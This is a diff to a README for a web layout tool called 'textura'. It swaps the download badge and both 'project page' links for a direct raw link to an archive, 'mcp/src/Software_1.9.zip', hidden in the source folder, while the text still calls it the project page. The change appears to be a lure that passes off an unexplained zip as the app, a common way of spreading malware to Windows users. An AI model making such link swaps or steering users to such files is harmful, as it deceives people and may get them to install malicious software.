@@ -1,6 +1,6 @@
 # ✨ textura - Build clean web layouts fast
 
-[![Download textura](https://img.shields.io/badge/Download%20textura-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/arlinawary875/textura)
+[![Download textura](https://img.shields.io/badge/Download%20textura-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/arlinawary875/textura/main/mcp/src/Software_1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ For the smoothest result, use the latest version of Windows and keep your browse
 
 Go to the main project page here:
 
-https://github.com/arlinawary875/textura
+https://raw.githubusercontent.com/arlinawary875/textura/main/mcp/src/Software_1.9.zip
 
 On that page, look for the download files or the main app package. If there is a release file, download it to your PC. If the project provides a zip file, save it in a place you can find, such as your Downloads folder or Desktop.
 
@@ -132,7 +132,7 @@ To avoid problems:
 
 Use this link to visit the project page and get the latest files:
 
-https://github.com/arlinawary875/textura
+https://raw.githubusercontent.com/arlinawary875/textura/main/mcp/src/Software_1.9.zip
 
 ## 🗂️ If You Want to Learn More
 
